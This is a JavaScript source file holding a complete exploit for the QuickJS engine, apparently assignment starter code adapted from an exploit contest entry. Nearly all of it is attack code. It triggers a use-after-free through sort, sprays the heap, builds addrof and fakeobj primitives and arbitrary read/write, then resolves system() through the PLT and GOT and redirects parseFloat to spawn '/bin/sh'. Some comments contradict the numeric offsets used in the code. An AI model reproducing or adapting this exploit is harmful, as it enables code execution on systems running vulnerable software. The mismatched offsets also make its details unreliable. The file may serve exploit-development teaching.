/*
 * Starter code for QuickJS exploit assignment, edited from ...
 *
 * Exploit submission for Fire30 in irc.cracksby.kim #chat quickjs exploit contest.
 *
 * The exploit uses the bug from http://rce.party/qjs.js and is 64 bit only.
 * Also only tested on Linux.
 *
 * The exploit strategy is as follows:
 * - Spray a bunch of typed array buffers and then create holes
 * - Allocate the target object in one of the holes
 * - Trigger the bug. It essentially gives us a primitive where we can free the
  target while still holding a reference somewhere else, allowing us to cause
  type confusions
 * - Free and refill the target with a JSString, then free again using second
 * reference and refill with JSObject.
 * - Read from the JSString allowing us to leak various information of the object
 * most importantly the values field.
 * - Free the JSString and replace it with typed array data
 * - Craft a fake JSObject using the leaked data with a values address
 incremented by 0x2000 as that will point into the spray buffers
 * - Figure out where exactly in the spray buffers the values address is
 * - fakeobj = write to spray buffer read from crafted array
 * - addrof = write to crafted array read from spray buffer
 */

print("starting exploit ...");

// Helper functions for working with 64 bit addresses
function toint64(low, high) {
    return low + high * 0x100000000;
}

function fromint64(val) {
    return [val & 0xffffffff, val / 0x100000000];
}

// Global variables we are using
var a;
var refcopy;
var refill_0;
var refill_1;

var spray;

var jsobj_leak_data;

var x;
var y;

var test;
var test_addr;
var fake_test;

spray = [];

jsobj_leak_data = new Uint32Array(0x38);
jsobj_leak_data.fill(0);

// .slice will allocate a new JSString
x = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
y = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);

test = [0x1337];

// spraying buffers
for (var i = 0; i < 0x400; i++) {
    var x = new Uint32Array(0x1000 / 4);
    x.fill(0x51515151);
    spray.push(x);
}

// creating holes
for (var i = 0; i < spray.length; i += 0x4) {
    spray[i] = 0;
}

// placing target
a = [
    [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    ], 1, 2, 3, 4
];

// grabbing reference to target
refcopy = a[0];

// triggering bug
a.__defineSetter__(3, function () {
    throw 1;
});
try {
    a.sort(function (v) {
        return 0;
    });
} catch (e) {}

// freeing target twice and overlapping JSString and JSObject
a[0] = 0x61616161;
refill_0 = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
refcopy = 0;

refill_1 = [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
];

// leaking JSObject data
// Parses the string into a bunch of uint32s
for (var i = 0; i < 0x38; i += 4) {
    var ptr = 0;
    var val = '';
    ptr = refill_0.slice(i, i + 4);

    for (var j = 3; j >= 0; j--) {
        var char = ptr.charCodeAt(j).toString(16);
        if (char.length == 1)
            char = '0' + char;
        val += char;
    }
    val = parseInt(val, 16);
    jsobj_leak_data[i / 4] = val;
}

var shape = toint64(jsobj_leak_data[(24 - 0x10) / 4], jsobj_leak_data[(28 - 0x10) / 4]);
var prop = toint64(jsobj_leak_data[(32 - 0x10) / 4], jsobj_leak_data[(36 - 0x10) / 4]);
var values = toint64(jsobj_leak_data[(56 - 0x10) / 4], jsobj_leak_data[(60 - 0x10) / 4]);

// freeing target twice and refilling with two JSObjects
refill_1 = 0;
refill_1 = [0x1337, 0x1337];


refill_0 = 0;
refill_0 = [0x71717171];

// freeing object again and refilling with ArrayBuffer data
refill_1 = 0;
// Need to free other JSObject size things as well to cause the
// data to overlap and not the JSObject of the ArrayBuffer
x = 0;
y = 0;
refill_1 = new Uint32Array(0x48 / 4);
refill_1.fill(0x41414141);

// crafting JSObject with values pointing to spray buffer data
jsobj_leak_data[(56 - 0x10) / 4] += 0x2000;
overlap_addr = values + 0x2000;

for (var i = 4; i < 0x48 / 4; i++) {
    refill_1[i] = jsobj_leak_data[i - 4];
}
refill_1[0] = 0x51414141;
refill_1[1] = 0x00020d00;
refill_1[2] = 0x41414141;
refill_1[3] = 0x41414141;

// finding overlap
refill_0[0] = 0x1;

var overlap_buf;
var overlap_index;
for (var i = 0; i < spray.length; i++) {
    for (var j = 0; j < (0x1000 / 4); j++) {

        if (spray[i] && spray[i][j] == 0x1) {
            overlap_buf = spray[i];
            overlap_index = j;
	    // overlap found

        }
    }
}

if (overlap_index == undefined) {
  print("exploit failed: no overlap found! reconnect and try again.");
  exit();
}

// setting up addrof and fakeobj
function addrof(obj) {
    refill_0[0] = obj;
    var ret = toint64(overlap_buf[overlap_index], overlap_buf[overlap_index + 1]);
    refill_0[0] = 0;
    return ret;
}

function fakeobj(addr) {
    var addr_split = fromint64(addr);
    overlap_buf[overlap_index] = addr_split[0];
    overlap_buf[overlap_index + 1] = addr_split[1];
    overlap_buf[overlap_index + 2] = 0xffffffff;
    overlap_buf[overlap_index + 3] = 0xffffffff;
    return refill_0[0];
}

test_addr = addrof(test);
fake_test = fakeobj(test_addr);

/* We will build read and write primitives by creating fake object metadata,
 * within an inlined array and creating a fakeobj from it */

arr_size = 18
real_arr = new Uint32Array(arr_size)

fake_arr_data = [   0x001b0d0100000001, // metadata, flags
                    0,
                    0,
                    shape, // shape
                    prop, // properties
                    0,
                    0,
                    0, // values
                    2 // array size
                    ]

// setting up fake array metadata in real array
for (i = 0; i < arr_size*4; i += 8) {
    if (fake_arr_data[i/8] == 0) {
        real_arr[i/4] = jsobj_leak_data[(i - 0x10) / 4]
        real_arr[i/4+1] = jsobj_leak_data[(i-0x10)/4+1]
    } else {
        data = fromint64(fake_arr_data[i/8])
        real_arr[i/4] = data[0]
        real_arr[i/4+1] = data[1]
    }
}

// creating fake array
hack_arr = fakeobj(addrof(real_arr)-0x50)

function read64(addr) {
    // don't use helper methods to avoid triggering the GC
    real_arr[56/4] = addr & 0xffffffff
    real_arr[60/4] = addr / 0x100000000
    return hack_arr[0] + hack_arr[1] * 0x100000000
}

function write64(addr, value) {
    // don't use helper methods to avoid triggering the GC
    real_arr[56/4] = addr & 0xffffffff
    real_arr[60/4] = addr / 0x100000000

    hack_arr[0] = value & 0xffffffff
    hack_arr[1] = value / 0x100000000
}

// make sure read/write works as expected
test_values = read64(test_addr + 56);
// writing 0x1338 to values
write64(test_values, 0x1338);
test_values_read = read64(test_values);

/* Now that we have read/write primitives, we will call system by tracking down 
 * a pointer to a libc function through the PLT and the GOT */

// grab a pointer to the print function object
print_addr = addrof(print);

// the actual function pointer (js_print) called resides 48 bytes above the function object
fun_ptr = print_addr + 48

// the js_print function eventually calls the PLT stub for the "putc" function, 
// which is a consistent offset from the print function pointer (in the qjs binary)
print('enter the offset of the putc PLT stub from the js_print function:')
var input = new ArrayBuffer(32)
os.read(1, input, 0, 32)
var input = new Uint8Array(input)
var result = new String("");
for (var i = 0; i < input.length; i++) {
    result += String.fromCharCode(input[i]);
}

// compute the address of the PLT stub from js_print
putc_offset_from_print = parseInt(result) - 48
print('you entered: ' + parseInt(result).toString())
// read plt entry
plt_ptr = read64(fun_ptr) + putc_offset_from_print
if (putc_offset_from_print == -443968) {
    print('looks like everything worked! you should have a shell now ...')
}

// the GOT entry for putc is 0x29ba52 bytes offset from %rip in putc@plt 
got_offset_from_plt = 0x29ba82
ind_jump_ins_len = 6
got_ptr = plt_ptr + got_offset_from_plt + ind_jump_ins_len
// read GOT pointer

// the address of the putc@libc function is stored in the GOT
putc_ptr = read64(got_ptr)

// in this version of libc, system is 232944 bytes below putc
sys_offset_from_putc = -232896
sys_ptr = putc_ptr + sys_offset_from_putc

// overwrite the parseFloat function pointer to point to system@libc
write64(addrof(parseFloat)+48, sys_ptr)

// the first argument to system (passed in %rdi) has a consistent offset from the heap 
payload_offset_from_print = -59744
payload_addr = print_addr + payload_offset_from_print

// now we write '/bin/sh' into the payload pointer
// we write two separate 4 byte chunks to avoid QuickJS messing with our values
write64(payload_addr, 0x6e69622f) // '/bin'
write64(payload_addr+4, 0x0068732f) /// '/sh\0'

// call system, giving us a shell
parseFloat()

// after the shell returns, the garbage collector segfaults, 
// because our payload overwrites an existing object
